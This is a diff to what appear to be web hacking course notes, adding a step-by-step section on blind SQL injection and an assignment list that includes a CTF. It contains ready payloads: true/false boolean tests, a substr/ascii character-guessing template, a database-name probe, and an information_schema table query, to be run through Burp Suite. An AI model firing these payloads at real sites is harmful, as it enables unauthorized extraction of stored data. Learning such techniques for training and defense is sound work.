@@ -72,7 +72,7 @@
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
-# Part 3. Blind-based SQL Injection Process
+# Part 3. Blind-based SQL Injection
 #   - Display output of SQL injection result: Union SQL Injection
 #   - Display error message: Error-based SQL injection
 #   - Not display error message: Blind-based SQL injection
@@ -85,4 +85,36 @@
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
-#
+# Part 4. Blind-based SQL Injection Process
+#  1. Find SQL Injection Point
+#    normaltic' and '1'='1      => True
+#    normaltic' and '1'='2      => False
+#  2. Check select function
+#    normaltic' and ((select'test')='test')) and '1'='1
+#  3. Attack format
+#    normaltic' and (_____________) and '1'='1
+#    substr() = The SUBSTR() function extracts a substring from a string (starting at any position)
+#    substr('test',1,1) => 't'
+#    substr('test',1,2) => 'te'
+#    substr('test',2,1) => 'e'
+#    substr((___SQL___),1,1)
+#    substr((select'test'),1,1)='t'
+#    normaltic' and (substr((select'test'),1,1)='t') and '1'='1
+#    ascii(substr((___SQL___),1,1)) > 0
+#    normaltic' and (ascii(substr((select'test'),1,1)) > 0) and '1'='1     = Attack format
+#    When operating the attack format, it executes the repeater in Burp suite
+#  4. Find database
+#    normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1'='1     = Attack format
+#  5. Find table name
+#    select table_name from information_schema.tables where table_schema = 'database_name'
+#  6. Find column name
+#  7. Find data
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+# Assignment
+#  1. Review Error-base SQL Injection
+#  2. Review Blind-based SQL Injection
+#  3. Review SQL Injection
+#  4. SQL Injection - CTF
+#  5. Web Site Development
